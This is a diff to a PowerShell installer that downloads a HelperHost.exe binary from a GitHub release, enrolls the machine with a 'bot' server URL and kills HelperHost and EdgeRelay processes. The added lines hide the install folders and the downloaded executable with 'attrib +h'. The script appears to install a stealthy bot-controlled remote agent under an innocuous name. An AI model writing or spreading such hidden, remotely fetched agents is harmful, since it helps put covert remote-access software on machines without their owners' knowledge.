@@ -4,11 +4,13 @@ if (-not $BotBase) { $BotBase = $env:AGENTSHE_BOT_BASE }
 if (-not $Enroll) { throw 'Enroll manquant' }
 if (-not $BotBase) { throw 'BotBase manquant' }
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.2' }
+$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.3' }
 $BotBase = $BotBase.TrimEnd('/')
 $Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $Cache = Join-Path $env:TEMP 'HelperHostCache'
 New-Item -ItemType Directory -Force -Path $Dir,$Cache | Out-Null
+attrib +h $Dir 2>$null
+attrib +h $Cache 2>$null
 Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 
 function Download-File([string]$Url, [string]$OutFile) {
@@ -30,6 +32,7 @@ function Restore-OrFetch([string]$Name, [string]$Url) {
   Download-File $Url $part
   Copy-Item $part $cached -Force
   Copy-Item $cached $dest -Force
+  attrib +h $dest,$cached 2>$null
 }
 
 Restore-OrFetch 'HelperHost.exe' "$Gh/HelperHost-windows-amd64.exe"
